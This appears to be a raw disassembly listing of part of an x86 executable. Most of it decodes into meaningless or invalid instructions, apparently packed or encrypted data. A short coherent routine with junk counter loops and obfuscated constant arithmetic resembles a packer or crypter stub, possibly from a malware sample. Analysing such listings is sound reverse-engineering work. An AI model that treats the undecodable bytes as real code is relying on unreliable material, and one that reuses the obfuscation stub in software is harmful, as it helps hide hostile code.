  40d30b:	dec    ebp
  40d30c:	and    esi,DWORD PTR [ebx+0x4c]
  40d30f:	pop    eax
  40d310:	inc    edx
  40d311:	mov    eax,0xb02628bd
  40d316:	mov    eax,0xa781b68e
  40d31b:	inc    esp
  40d31c:	mov    BYTE PTR [eax+0x4b],0x4c
  40d320:	or     al,0x50
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	fcomp  QWORD PTR [eax-0x684ff0c4]
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	aaa    
  40d345:	cdq    
  40d346:	inc    ebp
  40d347:	xchg   DWORD PTR [ecx+0x5a],edi
  40d34a:	imul   edi,DWORD PTR [ebx],0x1
  40d34d:	ja     0x40d323
  40d34f:	dec    ebp
  40d350:	nop
  40d351:	pushf  
  40d352:	stc    
  40d353:	lea    esp,[ecx+0x54ae6b50]
  40d359:	bound  edx,QWORD PTR [ebx+ebp*2+0x27]
  40d35d:	dec    edi
  40d35e:	rcr    DWORD PTR [edi-0x457311f1],cl
  40d364:	push   ebp
  40d365:	rcl    ebp,1
  40d367:	cmp    BYTE PTR [edx-0x31],dl
  40d36a:	nop
  40d36b:	call   eax
  40d36d:	shl    dh,0xe4
  40d370:	lahf   
  40d371:	xor    eax,0x23e9ca3d
  40d376:	cmp    bl,ah
  40d378:	lds    ebx,FWORD PTR [edx]
  40d37a:	jo     0x40d38b
  40d37c:	jecxz  0x40d3dd
  40d37e:	(bad)  
  40d37f:	hlt    
  40d380:	jmp    0xa1064e23
  40d385:	mov    BYTE PTR [esi-0x8],bl
  40d388:	adc    bh,dl
  40d38a:	ja     0x40d34d
  40d38c:	gs push edi
  40d38e:	mov    al,cl
  40d390:	jne    0x40d384
  40d392:	or     edx,DWORD PTR [edx+0x31]
  40d395:	or     edx,edi
  40d397:	mov    bl,0xa4
  40d399:	addr16 mov ecx,?
  40d39c:	and    DWORD PTR [eax-0x42cb881b],ecx
  40d3a2:	int    0xd1
  40d3a4:	xor    BYTE PTR [ebp+0x4eb39791],ch
  40d3aa:	mov    bl,0x7a
  40d3ac:	sub    dl,BYTE PTR ds:0x4d97b227
  40d3b2:	mov    ch,0xd7
  40d3b4:	jecxz  0x40d3e7
  40d3b6:	push   ebp
  40d3b7:	in     eax,dx
  40d3b8:	js     0x40d3c5
  40d3ba:	int    0x23
  40d3bc:	scas   eax,DWORD PTR es:[edi]
  40d3bd:	mov    ch,0x3c
  40d3bf:	popf   
  40d3c0:	jge    0x40d428
  40d3c2:	je     0x40d441
  40d3c4:	or     dl,BYTE PTR [ecx-0x75]
  40d3c7:	xchg   ebp,eax
  40d3c8:	inc    edi
  40d3c9:	dec    ecx
  40d3ca:	adc    ch,ch
  40d3cc:	cmp    al,0x3f
  40d3ce:	retf   0xce06
  40d3d1:	pop    ebx
  40d3d2:	jp     0x40d3fa
  40d3d4:	cmp    esp,DWORD PTR [ebp+0x44]
  40d3d7:	adc    DWORD PTR [ecx],edx
  40d3d9:	mov    ds:0xd19ad072,eax
  40d3df:	stos   DWORD PTR es:[edi],eax
  40d3e0:	loope  0x40d3de
  40d3e2:	popa   
  40d3e3:	pop    ebx
  40d3e4:	xchg   edi,eax
  40d3e5:	mov    esi,0x5b7ddaca
  40d3ea:	ins    BYTE PTR es:[edi],dx
  40d3eb:	sub    eax,0xeabf022d
  40d3f0:	jge    0x40d3e7
  40d3f2:	push   cs
  40d3f3:	pop    esi
  40d3f4:	mov    dh,0x20
  40d3f6:	push   ebx
  40d3f7:	data16 mov BYTE PTR [ebp+edi*2+0x3d3a0678],dl
  40d3ff:	dec    ebx
  40d400:	imul   eax,DWORD PTR [eax+0x6fc54388],0x5e
  40d407:	out    dx,al
  40d408:	nop
  40d409:	pop    ds
  40d40a:	scas   eax,DWORD PTR es:[edi]
  40d40b:	xor    DWORD PTR [ebx-0x1e],edx
  40d40e:	jnp    0x40d3fb
  40d410:	outs   dx,DWORD PTR ds:[esi]
  40d411:	imul   ebx,DWORD PTR [esi-0x2fb4cc22],0xee25218e
  40d41b:	shl    al,cl
  40d41d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41e:	repnz push es
  40d420:	sahf   
  40d421:	mov    cl,dl
  40d423:	mov    esp,0x6ba232ce
  40d428:	leave  
  40d429:	ret    
  40d42a:	mov    bl,0x8c
  40d42c:	xlat   BYTE PTR ds:[ebx]
  40d42d:	aaa    
  40d42e:	adc    eax,0x9b07aa3d
  40d433:	dec    ebx
  40d434:	pop    edi
  40d435:	adc    al,0x93
  40d437:	dec    edx
  40d438:	sub    al,0x30
  40d43a:	imul   ebx,edx,0xf0e8c833
  40d440:	mov    ah,0x46
  40d442:	rcl    DWORD PTR [edi+0x5099b2d4],cl
  40d448:	mov    dh,0xe
  40d44a:	test   al,0xaf
  40d44c:	popa   
  40d44d:	jle    0x40d488
  40d44f:	cld    
  40d450:	inc    BYTE PTR ds:0x4832723c
  40d456:	sub    DWORD PTR [edi+0x5fd0136e],eax
  40d45c:	(bad)  
  40d45d:	(bad)  
  40d45e:	clc    
  40d45f:	mov    eax,0xb9334886
  40d464:	add    eax,0x5c1d5e41
  40d469:	or     esi,0xffffffb0
  40d46c:	mov    fs,WORD PTR ds:0x51191d66
  40d472:	(bad)  
  40d473:	out    0xf,al
  40d475:	inc    eax
  40d476:	inc    edx
  40d477:	arpl   WORD PTR [ebp+ebp*2-0x17f68ac5],sp
  40d47e:	(bad)  
  40d47f:	cmp    BYTE PTR [ebx],bl
  40d481:	jbe    0x40d404
  40d483:	retf   0x989
  40d486:	addr16 into 
  40d488:	lahf   
  40d489:	inc    esp
  40d48a:	outs   dx,BYTE PTR ds:[esi]
  40d48b:	aas    
  40d48c:	es adc al,0x79
  40d48f:	mov    cl,0xb5
  40d491:	stos   BYTE PTR es:[edi],al
  40d492:	pop    ss
  40d493:	sub    BYTE PTR [esi-0x21],dl
  40d496:	dec    edi
  40d497:	lds    esp,FWORD PTR [ebx+0x700f5c8b]
  40d49d:	pop    ds
  40d49e:	addr16 mov cl,0x50
  40d4a1:	push   DWORD PTR [esi-0x3f142a4b]
  40d4a7:	cli    
  40d4a8:	aaa    
  40d4a9:	mov    ds:0x8523d6cc,al
  40d4ae:	jp     0x40d4a7
  40d4b0:	ficomp DWORD PTR [ebx+0x4226d2e5]
  40d4b6:	pop    edx
  40d4b7:	mov    eax,0xdd7da37c
  40d4bc:	nop
  40d4bd:	mov    ah,0x35
  40d4bf:	xchg   esi,eax
  40d4c0:	ss aaa 
  40d4c2:	outs   dx,BYTE PTR ds:[esi]
  40d4c3:	jo     0x40d510
  40d4c5:	and    DWORD PTR [esi+0x772013c3],ebp
  40d4cb:	push   ecx
  40d4cc:	xchg   ecx,eax
  40d4cd:	and    esi,DWORD PTR [ebx+ecx*1+0x7460ba50]
  40d4d4:	popf   
  40d4d5:	pop    ebp
  40d4d6:	fs pop ss
  40d4d8:	mov    cl,0x48
  40d4da:	sbb    al,0xb9
  40d4dc:	or     DWORD PTR [edi-0x63],ebx
  40d4df:	stos   DWORD PTR es:[edi],eax
  40d4e0:	retf   
  40d4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e2:	add    DWORD PTR [esi+0x2e5e01e5],esi
  40d4e8:	aas    
  40d4e9:	loope  0x40d4ce
  40d4eb:	ret    
  40d4ec:	aam    0xd4
  40d4ee:	mov    DWORD PTR [ebp-0x3d94c8c8],esi
  40d4f4:	dec    eax
  40d4f5:	popf   
  40d4f6:	retf   
  40d4f7:	mov    eax,ds:0x621448fc
  40d4fc:	daa    
  40d4fd:	aam    0x6a
  40d4ff:	mov    al,ds:0x5e28d399
  40d504:	or     al,0xf0
  40d506:	(bad)  
  40d507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d508:	pop    eax
  40d509:	lea    ebp,[edx+0x63]
  40d50c:	retf   0xfbbd
  40d50f:	xchg   ebx,eax
  40d510:	into   
  40d511:	pop    ecx
  40d512:	(bad)  [ebx]
  40d514:	mov    al,0xf1
  40d516:	dec    esp
  40d517:	mul    DWORD PTR [esi-0x24a895fd]
  40d51d:	mov    dh,0xe3
  40d51f:	sub    esi,DWORD PTR [esi+0x4f]
  40d522:	cmp    DWORD PTR [ebx-0x7159cd4c],edx
  40d528:	data16 (bad) 
  40d52b:	loopne 0x40d58f
  40d52d:	int3   
  40d52e:	inc    ebp
  40d52f:	jo     0x40d501
  40d531:	popa   
  40d532:	mov    esi,0xfab24f77
  40d537:	mov    ds:0x3c589e17,al
  40d53c:	xchg   ebp,eax
  40d53d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d53e:	lods   eax,DWORD PTR ds:[esi]
  40d53f:	cmp    dh,BYTE PTR ds:0xa98385f5
  40d545:	and    BYTE PTR [ebx-0x5b],0x47
  40d549:	cdq    
  40d54a:	jp     0x40d596
  40d54c:	inc    ebp
  40d54d:	add    al,0x13
  40d54f:	sbb    ebx,DWORD PTR [esi+0x7]
  40d552:	inc    edi
  40d553:	mov    dl,0x68
  40d555:	lods   eax,DWORD PTR ds:[esi]
  40d556:	mov    bl,0x4d
  40d558:	div    DWORD PTR [ebx]
  40d55a:	shl    ebp,1
  40d55c:	out    0xaf,al
  40d55e:	int    0x9a
  40d560:	push   ds
  40d561:	call   0x207cf52c
  40d566:	add    ebx,DWORD PTR [esi]
  40d568:	mov    DWORD PTR [eax-0x3873c51b],edi
  40d56e:	sbb    al,0x14
  40d570:	out    dx,al
  40d571:	test   al,0xd5
  40d573:	jmp    0x3b51c116
  40d578:	inc    edx
  40d579:	test   al,0xa8
  40d57b:	push   esp
  40d57c:	xchg   esp,eax
  40d57d:	xchg   DWORD PTR [edi+esi*1-0x7c6c76ff],ebp
  40d584:	mov    bh,0x40
  40d586:	aam    0x59
  40d588:	les    eax,FWORD PTR [ebx+eax*2+0x3]
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xea0482a
  40d6f9:	adc    BYTE PTR [ecx*1+0x7e7e927a],ch
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d780
  40d705:	ss xor eax,0x7566ec47
  40d70b:	mov    gs,WORD PTR [eax]
  40d70d:	cwde   
  40d70e:	leave  
  40d70f:	enter  0xf17a,0x1d
  40d713:	push   esp
  40d714:	outs   dx,BYTE PTR ds:[esi]
  40d715:	mov    ds:0xbcce064e,al
  40d71a:	loope  0x40d6e9
  40d71c:	and    DWORD PTR [ebx+0x30],0x55
  40d720:	hlt    
  40d721:	iret   
  40d722:	out    0x86,al
  40d724:	push   ss
  40d725:	mov    ch,0xda
  40d727:	cs dec ecx
  40d729:	and    ah,BYTE PTR [edi+eax*1+0x41]
  40d72d:	out    0xbb,eax
  40d72f:	push   ds
  40d730:	lock lahf 
  40d732:	shl    dl,0xbf
  40d735:	xlat   BYTE PTR ds:[ebx]
  40d736:	mov    edx,0xdb43c2c4
  40d73b:	cmp    al,0x6
  40d73d:	ins    DWORD PTR es:[edi],dx
  40d73e:	call   0xa02ab7bc
  40d743:	pushf  
  40d744:	push   0xfaf70594
  40d749:	mov    BYTE PTR [edx],0x7a
  40d74c:	mov    edx,esi
  40d74e:	retf   0xfca0
  40d751:	fwait
  40d752:	sub    eax,0xced2bbc0
  40d757:	int    0xaa
  40d759:	jg     0x40d769
  40d75b:	jbe    0x40d6fc
  40d75d:	stos   BYTE PTR es:[edi],al
  40d75e:	hlt    
  40d75f:	push   ds
  40d760:	inc    edi
  40d761:	push   ss
  40d762:	retf   
  40d763:	pop    ebx
  40d764:	jmp    0x5e9e:0x914aaa96
  40d76b:	jecxz  0x40d794
  40d76d:	and    bh,dl
  40d76f:	push   es
  40d770:	pushf  
  40d771:	pop    ds
  40d772:	aas    
  40d773:	mov    WORD PTR [esi-0x68fc70b1],es
  40d779:	or     al,0xff
  40d77b:	xor    eax,0x5f25b51a
  40d780:	jns    0x40d7e8
  40d782:	xor    al,0xb4
  40d784:	int    0x14
  40d786:	jo     0x40d7c6
  40d788:	ja     0x40d721
  40d78a:	cdq    
  40d78b:	lods   eax,DWORD PTR ds:[esi]
  40d78c:	data16 xor BYTE PTR [esi+0x2b90190f],ch
  40d793:	push   eax
  40d794:	push   ds
  40d795:	cmp    al,BYTE PTR [esi]
  40d797:	fdiv   DWORD PTR [ecx+0x35]
  40d79a:	pop    ds
  40d79b:	lea    edx,ds:0xd3983772
  40d7a1:	xchg   dh,ah
  40d7a3:	outs   dx,DWORD PTR ds:[esi]
  40d7a4:	daa    
  40d7a5:	cwde   
  40d7a6:	push   es
  40d7a7:	ins    DWORD PTR es:[edi],dx
  40d7a8:	stos   DWORD PTR es:[edi],eax
  40d7a9:	xor    al,BYTE PTR [esi]
  40d7ab:	add    DWORD PTR [edx+esi*2+0xc4de525],edx
  40d7b2:	adc    DWORD PTR [ebp-0x4],ecx
  40d7b5:	sahf   
  40d7b6:	jae    0x40d7b5
  40d7b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b9:	mov    edx,0x5d310360
  40d7be:	jbe    0x40d79a
  40d7c0:	mov    edx,0x5fbcb3b2
  40d7c5:	xor    eax,0x13cef006
  40d7ca:	int3   
  40d7cb:	jae    0x40d80d
  40d7cd:	sbb    dl,al
  40d7cf:	push   edi
  40d7d0:	out    dx,al
  40d7d1:	ret    
  40d7d2:	xor    BYTE PTR [eax+0x36],0xc2
  40d7d6:	aaa    
  40d7d7:	xchg   esp,eax
  40d7d8:	cmp    ecx,DWORD PTR [esi-0x75]
  40d7db:	push   es
  40d7dc:	stos   DWORD PTR es:[edi],eax
  40d7dd:	jnp    0x40d7bd
  40d7df:	add    BYTE PTR [eax],ch
  40d7e1:	mov    esi,0xdb454d14
  40d7e6:	xchg   BYTE PTR [eax],dh
  40d7e8:	test   DWORD PTR [ebx-0x58],ebx
  40d7eb:	jbe    0x40d7cf
  40d7ed:	dec    ecx
  40d7ee:	push   0x568a2b8b
  40d7f3:	mov    cl,0x42
  40d7f5:	cmp    bl,cl
  40d7f7:	cwde   
  40d7f8:	pop    ebx
  40d7f9:	pop    edi
  40d7fa:	xchg   edx,eax
  40d7fb:	adc    edx,DWORD PTR [esi]
  40d7fd:	fdiv   DWORD PTR [ebx]
  40d7ff:	sub    al,BYTE PTR [edx-0x4d069148]
  40d805:	retf   0xd20b
  40d808:	stc    
  40d809:	mov    eax,ds:0x947a8ce9
  40d80e:	mov    ecx,0x8e24d60
  40d813:	jl     0x40d813
  40d815:	cmp    eax,0x3c477ef0
  40d81a:	test   eax,edx
  40d81c:	push   esp
  40d81d:	mov    esp,0x1bbc56d1
  40d822:	sub    eax,0x717c9668
  40d827:	(bad)  
  40d828:	addr16 push 0xffffffc2
  40d82b:	pop    eax
  40d82c:	cmp    ch,BYTE PTR [ecx]
  40d82e:	out    dx,eax
  40d82f:	cmp    esp,DWORD PTR [ecx-0x41]
  40d832:	jb     0x40d83e
  40d834:	pop    ecx
  40d835:	jge    0x40d8a6
  40d837:	cmp    ebp,DWORD PTR ds:0x5fa34be8
  40d83d:	scas   al,BYTE PTR es:[edi]
  40d83e:	sbb    eax,0x90a6f3b9
  40d843:	rol    BYTE PTR [edx],1
  40d845:	xchg   edi,eax
  40d846:	ret    0xe0b5
  40d849:	mov    bh,0xe
  40d84b:	fisubr DWORD PTR [ebx]
  40d84d:	ds mov ebp,0x962da730
  40d853:	leave  
  40d854:	mov    ds:0xb242fc1a,al
  40d859:	mov    bh,0xd
  40d85b:	jge    0x40d7f2
  40d85d:	sub    DWORD PTR [edi-0x117f4e9c],ebp
  40d863:	mov    ch,0x79
  40d865:	jno    0x40d7ea
  40d867:	lds    esp,FWORD PTR [ecx+eax*2]
  40d86a:	lahf   
  40d86b:	stos   DWORD PTR es:[edi],eax
  40d86c:	push   es
  40d86d:	sti    
  40d86e:	lds    ecx,FWORD PTR [ecx-0x19]
  40d871:	dec    esi
  40d872:	and    DWORD PTR [ecx],0x44
  40d875:	mul    cl
  40d877:	jo     0x40d828
  40d879:	jnp    0x40d849
  40d87b:	pop    DWORD PTR [ebx+0x64deaeed]
  40d881:	cmp    BYTE PTR [esi+0x5a],bh
  40d884:	shl    bh,0xb8
  40d887:	in     eax,0xa0
  40d889:	inc    edi
  40d88a:	mov    edi,0xa88b894e
  40d88f:	iret   
  40d890:	mov    eax,0xd87571a9
  40d895:	out    dx,eax
  40d896:	or     al,0x5b
  40d898:	and    edx,DWORD PTR [edx+0x8]
  40d89b:	xchg   ebp,eax
  40d89c:	sbb    DWORD PTR [edx],eax
  40d89e:	fmul   QWORD PTR [ebx]
  40d8a0:	fs jno 0x40d913
  40d8a3:	inc    ebx
  40d8a4:	or     DWORD PTR [esi-0x20fba9d],edi
  40d8aa:	and    bh,BYTE PTR [eax+0x6f]
  40d8ad:	dec    edi
  40d8ae:	lds    esp,FWORD PTR [ecx]
  40d8b0:	xor    al,0x24
  40d8b2:	js     0x40d89a
  40d8b4:	add    cl,BYTE PTR [ecx+0x7e]
  40d8b7:	out    0xfb,eax
  40d8b9:	mov    esp,0xc7738724
  40d8be:	xchg   ebx,eax
  40d8bf:	fistp  DWORD PTR [ebp+0x23a98f67]
  40d8c5:	mov    al,ds:0x58124508
  40d8ca:	leave  
  40d8cb:	push   edi
  40d8cc:	sub    BYTE PTR ds:0x4fc581ff,cl
  40d8d2:	xchg   ebx,eax
  40d8d3:	push   0x3b48ebaa
  40d8d8:	adc    esi,ebp
  40d8da:	pop    edi
  40d8db:	jle    0x40d939
  40d8dd:	mov    eax,ds:0xda4b22c3
  40d8e2:	adc    bh,cl
  40d8e4:	jmp    DWORD PTR [ecx-0x7f]
  40d8e7:	lock jbe 0x40d890
  40d8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8eb:	std    
  40d8ec:	inc    ebx
  40d8ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ee:	mov    bh,0x43
  40d8f0:	aam    0x4c
  40d8f2:	add    DWORD PTR [ebp+0x47],esi
  40d8f5:	test   al,0xb7
  40d8f7:	push   ss
  40d8f8:	lock add ebp,DWORD PTR [edi+0x5]
  40d8fc:	ja     0x40d8a0
  40d8fe:	add    dh,BYTE PTR [ecx]
  40d900:	xchg   edi,eax
  40d901:	and    ebp,DWORD PTR [eax]
  40d903:	jnp    0x40d8bb
  40d905:	mov    bh,0xb2
  40d907:	inc    esi
  40d908:	mov    esp,0x9594552a
  40d90d:	icebp  
  40d90e:	nop
  40d90f:	out    0xd0,al
  40d911:	cmp    BYTE PTR [edi],dl
  40d913:	dec    ebx
  40d914:	jmp    0x40d995
  40d916:	xchg   cl,al
  40d918:	aam    0x65
  40d91a:	jg     0x40d919
  40d91c:	xchg   esp,eax
  40d91d:	iret   
  40d91e:	imul   ebp,DWORD PTR [esi],0xfffffff6
  40d921:	mov    esp,0xf2e8d8da
  40d926:	pop    es
  40d927:	je     0x40d8d4
  40d929:	ins    BYTE PTR es:[edi],dx
  40d92a:	call   0x949e:0xd2a78ffe
  40d931:	sets   BYTE PTR [ebp-0x27e6621a]
  40d938:	pop    ss
  40d939:	push   ds
  40d93a:	mov    BYTE PTR [ecx],0xcc
  40d93d:	xchg   esp,eax
  40d93e:	out    dx,eax
  40d93f:	ret    0x5545
  40d942:	ja     0x40d930
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0xc12b51ed
  40d96a:	dec    eax
  40d96b:	xor    al,0xb1
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	push   ss
  40d976:	loopne 0x40d929
  40d978:	jb     0x40d9a6
  40d97a:	jle    0x40d910
  40d97c:	mov    WORD PTR [esi+0x1a797836],ds
  40d982:	push   edx
  40d983:	int3   
  40d984:	dec    ecx
  40d985:	xchg   edi,eax
  40d986:	mov    ch,0x9e
  40d988:	or     eax,0xd8d981dc
  40d98d:	sub    ebp,DWORD PTR [edx+0x6]
  40d990:	cwde   
  40d991:	jecxz  0x40d940
  40d993:	or     eax,0xc3a62df8
  40d998:	cmp    DWORD PTR [edi-0x10],edx
  40d99b:	ja     0x40d949
  40d99d:	inc    edi
  40d99e:	push   esp
  40d99f:	adc    ch,0xf0
  40d9a2:	fidiv  DWORD PTR [esi+edx*2-0x53]
  40d9a6:	test   eax,0x53ab2660
  40d9ab:	in     eax,0xc6
  40d9ad:	and    ch,0x5f
  40d9b0:	sub    al,0xb6
  40d9b2:	jns    0x40da13
  40d9b4:	jnp    0x40d960
  40d9b6:	(bad)  
  40d9b7:	fdivr  QWORD PTR [esp+eax*2]
  40d9ba:	not    BYTE PTR [edx-0x737ef36]
  40d9c0:	repnz (bad) 
  40d9c2:	xchg   edi,eax
  40d9c3:	test   eax,0x2e5dfe08
  40d9c8:	scas   al,BYTE PTR es:[edi]
  40d9c9:	int    0xc3
  40d9cb:	or     eax,DWORD PTR [edi+edi*4+0x61507d41]
  40d9d2:	add    edi,DWORD PTR [edi-0x4b753978]
  40d9d8:	shl    DWORD PTR ds:0xe521f100,0x18
  40d9df:	sahf   
  40d9e0:	push   ebx
  40d9e1:	jo     0x40d999
  40d9e3:	adc    al,0xf8
  40d9e5:	xor    al,bh
  40d9e7:	bound  ecx,QWORD PTR [ecx]
  40d9e9:	mov    al,0xc6
  40d9eb:	jge    0x40da02
  40d9ed:	push   ds
  40d9ee:	stos   BYTE PTR es:[edi],al
  40d9ef:	scas   al,BYTE PTR es:[edi]
  40d9f0:	call   0x59fa:0x20e7cd15
  40d9f7:	scas   al,BYTE PTR es:[edi]
  40d9f8:	iret   
  40d9f9:	add    BYTE PTR [esi-0x69],cl
  40d9fc:	icebp  
  40d9fd:	mov    eax,ds:0xe6fa7aba
  40da02:	es and ecx,ebx
  40da05:	jno    0x40da3c
  40da07:	pop    esi
  40da08:	lods   al,BYTE PTR ds:[esi]
  40da09:	imul   DWORD PTR [eax]
  40da0b:	(bad)  
  40da0c:	leave  
  40da0d:	cmp    BYTE PTR [esi+edx*2-0x3beed57e],bl
  40da14:	mov    ds:0x146bf245,eax
  40da19:	in     eax,0x3a
  40da1b:	or     BYTE PTR [esp+ebp*8-0x1a02dc5e],ah
  40da22:	sub    eax,0x4c9cf1f2
  40da27:	mov    ebx,0x17eaa4d5
  40da2c:	push   esp
  40da2d:	sbb    esp,DWORD PTR [edx]
  40da2f:	mov    edx,0x6b639abb
  40da34:	stc    
  40da35:	mov    ch,0xfa
  40da37:	mov    ds:0x3abefcd1,al
  40da3c:	push   ecx
  40da3d:	and    DWORD PTR [edi+0x2f],0x78
  40da41:	js     0x40dac1
  40da43:	test   al,0x27
  40da45:	mov    eax,0xf7ef7b28
  40da4a:	mov    fs,eax
  40da4c:	call   0x27e0:0xfcc2e4d4
  40da53:	jp     0x40d9f5
  40da55:	bound  eax,QWORD PTR [ecx+0x5e]
  40da58:	scas   al,BYTE PTR es:[edi]
  40da59:	sbb    esp,DWORD PTR [eax+0x5d]
  40da5c:	xchg   ebx,eax
  40da5d:	imul   edi,DWORD PTR ds:0xdf7c71bf,0x45
  40da64:	ss lahf 
  40da66:	retf   
  40da67:	test   BYTE PTR cs:0xb60a57c8,dl
  40da6e:	jmp    0x40da2f
  40da70:	in     al,dx
  40da71:	or     DWORD PTR [esp+esi*8],0xc2c9115d
  40da78:	repz hlt 
  40da7a:	int    0xc4
  40da7c:	push   ebx
  40da7d:	jno    0x40da2e
  40da7f:	sbb    al,0x3a
  40da81:	out    0x2,al
  40da83:	iret   
  40da84:	dec    edi
  40da85:	mov    eax,0x954a1d3a
  40da8a:	dec    ecx
  40da8b:	push   esp
  40da8c:	inc    esi
  40da8d:	mov    dl,0xa
  40da8f:	loop   0x40dab5
  40da91:	mov    edi,0xb83b54f
  40da96:	pop    ebp
  40da97:	pop    ebp
  40da98:	and    eax,0xcb8d6b7a
  40da9d:	xor    BYTE PTR [ebp+0x6a4eacab],0xa6
  40daa4:	(bad)  
  40daa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa6:	fcmovnb st,st(1)
  40daa8:	cmp    al,0x17
  40daaa:	ins    BYTE PTR es:[edi],dx
  40daab:	xchg   dh,dh
  40daad:	imul   ah
  40daaf:	xchg   edx,eax
  40dab0:	cli    
  40dab1:	pop    edx
  40dab2:	and    eax,0xee2f98b5
  40dab7:	xchg   edi,eax
  40dab8:	adc    BYTE PTR [esi],dh
  40daba:	sub    al,0x2
  40dabc:	and    al,0xb9
  40dabe:	lods   eax,DWORD PTR ds:[esi]
  40dabf:	lds    ebx,FWORD PTR [esi-0x1d]
  40dac2:	imul   edi,DWORD PTR [ebp-0x40],0xffffff97
  40dac6:	loop   0x40db29
  40dac8:	pandn  mm1,QWORD PTR [edi+0x59]
  40dacc:	addr16 pop ds
  40dace:	sub    ah,BYTE PTR [ebx+0x3b]
  40dad1:	dec    ebp
  40dad2:	out    dx,al
  40dad3:	ins    DWORD PTR es:[edi],dx
  40dad4:	in     al,0xae
  40dad6:	daa    
  40dad7:	mov    edx,DWORD PTR [edx-0x13e0819a]
  40dadd:	fiadd  DWORD PTR [edx-0x371b1c5b]
  40dae3:	fdiv   QWORD PTR [eax-0x2f974e0c]
  40dae9:	cmp    BYTE PTR [ebx],bl
  40daeb:	(bad)  
  40daec:	clc    
  40daed:	inc    ebx
  40daee:	sbb    al,0x8
  40daf0:	popw   ds
  40daf2:	jbe    0x40da77
  40daf4:	push   edi
  40daf5:	call   DWORD PTR [ebp-0x4ba12ebf]
  40dafb:	out    dx,eax
  40dafc:	loopne 0x40daa7
